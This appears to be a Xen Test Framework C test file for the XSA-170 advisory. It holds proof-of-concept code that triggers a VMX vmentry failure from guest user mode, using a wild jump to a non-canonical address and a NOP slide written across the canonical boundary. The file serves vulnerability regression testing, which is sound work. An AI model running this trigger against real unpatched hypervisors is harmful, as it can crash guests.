/**
 * @file tests/xsa-170/main.c
 * @ref test-xsa-170
 *
 * @page test-xsa-170 XSA-170
 *
 * Advisory: [XSA-170](https://xenbits.xen.org/xsa/advisory-170.html)
 *
 * XSA-170 concerns a vmentry quirk on VMX hardware, which causes the vmentry
 * to fail if @%rip is non-canonical.  This bug does not affect SVM hardware,
 * where vmentries are permitted with a non-canonical @%rip.
 *
 * There are legitimate circumstances which can arise, requiring Xen to
 * re-enter the guest with a non-canonical @%rip (tested below), and this bug
 * prevents Xen from providing architectural behaviour to the guest.
 *
 * The important aspect is that Xen doesn't suffer a vmentry failure and crash
 * the guest due to userspace actions.
 *
 * @see tests/xsa-170/main.c
 */

#include <xtf.h>

const char test_title[] = "XSA-170 PoC";

bool test_wants_user_mappings = true;
bool test_needs_fep = true;

void wild_jump(void)
{
    /*
     * After XSA-170, Xen's instruction emulator was improved to perform a
     * 0-length instruction fetch at the destination of a branch.  If the
     * branch destination is bad (non-canonical, or outside of %cs limit), a
     * #GP is raised instead of branching.
     */
    asm volatile (_ASM_XEN_FEP
                  "1: jmp *%0;"
                  ".Lwild_fixup:"
                  _ASM_EXTABLE(1b, .Lwild_fixup)
                  :: "rm" (0x8000000000000000ULL));
}

void nop_slide(void)
{
    /*
     * AMD hardware can correctly re-enter the guest with a non-canonical
     * %rip. Use an EXTABLE entry to recover from the architecturally-correct
     * results of executing ones way into the non-canonical region.
     */
    asm volatile ("jmp *%0;"
                  ".Lnop_fixup:"
                  _ASM_EXTABLE(0x0000800000000000, .Lnop_fixup) /* Correct. */
                  _ASM_EXTABLE(0xffff800000000000, .Lnop_fixup) /* XSA-170. */
                  :: "rm" (0x00007ffffffffff8ULL));
}

void test_main(void)
{
    static intpte_t nl2t[L2_PT_ENTRIES] __page_aligned_bss;
    static intpte_t nl1t[L1_PT_ENTRIES] __page_aligned_bss;
    static uint8_t  buffer[PAGE_SIZE] __page_aligned_bss;

    printk("  Executing user wild jump\n");
    exec_user_void(wild_jump);

    /* Map 'buffer' at the lower canonical boundary. */
    nl1t[511] =            pte_from_virt(buffer,          PF_SYM(AD, U, RW, P));
    nl2t[511] =            pte_from_virt(nl1t,            PF_SYM(AD, U, RW, P));
    pae_l3_identmap[511] = pte_from_virt(nl2t,            PF_SYM(AD, U, RW, P));
    pae_l4_identmap[255] = pte_from_virt(pae_l3_identmap, PF_SYM(AD, U, RW, P));
    barrier();

    void *volatile /* GCC issue 99578 */ ptr = _p(0x00007ffffffffff8ULL);

    /*
     * Put a NOP slide and Forced Emulation Prefix as the final instructions
     * before the boundary.
     */
    memcpy(ptr, "\x90\x90\xf\xbxen\x90", 8);

    printk("  Executing user nop slide\n");
    exec_user_void(nop_slide);

    /*
     * If we are still alive, Xen re-entered the guest properly (or suitably
     * improperly).
     */

    xtf_success("Success: Not vulnerable to XSA-170\n");
}

/*
 * Local variables:
 * mode: C
 * c-file-style: "BSD"
 * c-basic-offset: 4
 * tab-width: 4
 * indent-tabs-mode: nil
 * End:
 */
